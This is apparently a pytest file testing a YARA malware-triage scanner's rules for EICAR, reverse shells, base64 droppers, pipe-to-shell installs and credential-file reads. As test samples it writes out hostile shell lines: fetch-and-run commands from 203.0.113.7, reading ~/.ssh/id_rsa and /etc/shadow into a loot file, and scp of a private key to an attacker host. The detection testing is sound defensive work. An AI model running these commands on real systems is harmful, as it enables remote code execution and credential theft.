from pathlib import Path

from yara_triage import scan

# known_bad_samples/, not the repo-level samples/ -- the latter is outside
# the Docker build context (verdict-engine/'s Dockerfile only COPYs this
# directory), so a path reaching for it works on a plain checkout but
# 404s inside the container. known_bad_samples/ already has content-
# identical copies of the two samples this needs.
CORPUS_DIR = Path(__file__).parent.parent / "known_bad_samples"

# Not read from samples/eicar.txt: that file is intentionally gitignored
# (see samples/EICAR.md) and real-time antivirus deletes it on sight, so
# the test constructs the signature in memory instead.
EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

HARMLESS = b'#!/bin/bash\necho "just printing some text"\n'


def test_scan_detects_eicar():
    rules = {m["rule"] for m in scan(EICAR)}
    assert "EICAR_Test_String" in rules


def test_scan_detects_devtcp_reverse_shell():
    data = (CORPUS_DIR / "devtcp_reverse_shell.sh").read_bytes()
    rules = {m["rule"] for m in scan(data)}
    assert "Shell_Dev_TCP_Redirect" in rules


def test_scan_detects_sensitive_write():
    data = (CORPUS_DIR / "sensitive_write.sh").read_bytes()
    rules = {m["rule"] for m in scan(data)}
    assert "Shell_Sensitive_Write" in rules


def test_scan_clean_file_no_matches():
    assert scan(HARMLESS) == []


# samples/harmless.sh in full, inline for the same build-context reason as
# above. Must stay match-free under every rule, old and new.
HARMLESS_SH = b'#!/bin/bash\necho "just printing some text"\necho "nothing to see here" > /tmp/harmless_output.txt\n'

BASE64_DROPPER = (
    b"#!/bin/bash\n"
    b"echo 'IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vMjAzLjAuMTEzLjcvcCB8IGJhc2gK' | base64 -d | bash\n"
)
PIPE_TO_SHELL = b"#!/bin/bash\nwget -qO- http://203.0.113.7/install.sh | sudo sh\n"
CREDENTIAL_READ = b"#!/bin/bash\ncat ~/.ssh/id_rsa /etc/shadow > /tmp/loot\n"


def _rules(data):
    return {m["rule"] for m in scan(data)}


def test_scan_harmless_sample_no_matches():
    assert scan(HARMLESS_SH) == []


def test_scan_detects_base64_decode_payload():
    assert "Shell_Base64_Decode_Payload" in _rules(BASE64_DROPPER)


def test_scan_base64_blob_without_decode_is_not_flagged():
    # A sha256 checksum matches the base64 regex on its own; without a
    # decode step it's just data, and a match here would condemn it unrun.
    checksum = b"#!/bin/bash\necho 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f > sum.txt\n"
    assert scan(checksum) == []


def test_scan_detects_pipe_to_shell():
    assert "Shell_Pipe_To_Shell" in _rules(PIPE_TO_SHELL)
    assert "Shell_Pipe_To_Shell" in _rules(b"curl -fsSL http://203.0.113.7/x | bash\n")


def test_scan_download_to_file_is_not_pipe_to_shell():
    assert "Shell_Pipe_To_Shell" not in _rules(b"curl -o out.tar.gz http://203.0.113.7/x | tee log\n")


def test_scan_detects_credential_file_read():
    assert "Credential_File_Read" in _rules(CREDENTIAL_READ)
    assert "Credential_File_Read" in _rules(b"scp $HOME/.ssh/id_ed25519 attacker@203.0.113.7:\n")


def test_scan_public_key_is_not_credential_read():
    assert "Credential_File_Read" not in _rules(b"cat ~/.ssh/id_rsa.pub\n")
